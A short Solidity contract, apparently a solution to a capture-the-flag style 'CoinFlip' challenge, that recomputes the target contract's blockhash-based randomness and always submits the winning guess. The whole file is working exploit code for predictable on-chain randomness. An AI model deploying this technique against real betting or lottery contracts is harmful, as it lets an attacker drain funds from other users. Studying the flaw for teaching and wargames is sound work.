/**
 *Submitted for verification at Etherscan.io on 2023-01-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// Duplicate the function signature from CoinFlip.sol
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

// Duplicate the algorithm but only give the correct answer
contract CoinFlipWrapper {
    ICoinFlip COIN_FLIP_CONTRACT = ICoinFlip(address(0));

    function flip() public {
        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;

        COIN_FLIP_CONTRACT.flip(side);
    }

    function getContract() public view returns (address) {
        return address(COIN_FLIP_CONTRACT);
    }

    function setContract(address coinFlipAddress) public {
        COIN_FLIP_CONTRACT = ICoinFlip(coinFlipAddress);
    }
}